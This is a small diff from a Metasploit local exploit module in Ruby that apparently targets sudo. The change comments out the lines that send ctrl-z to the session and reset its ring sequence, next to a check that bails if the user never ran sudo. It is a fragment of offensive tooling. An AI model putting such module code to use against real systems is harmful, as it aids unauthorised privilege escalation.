@@ -157,8 +157,8 @@ class Metasploit3 < Msf::Exploit::Local
 		print_good "Running: "
 		print sudo_cmd + "\n"
 		output = cmd_exec(sudo_cmd, nil, 5)
-		session.shell_write("\x1a") # send ctrl-z :)
-		session.reset_ring_sequence
+		# session.shell_write("\x1a") # send ctrl-z :)
+		# session.reset_ring_sequence
 		if output =~ /incorrect password attempts\s*$/i
 			fail_with(Exploit::Failure::NotFound,
 				"User has never run sudo, and is therefore not vulnerable. Bailing.")
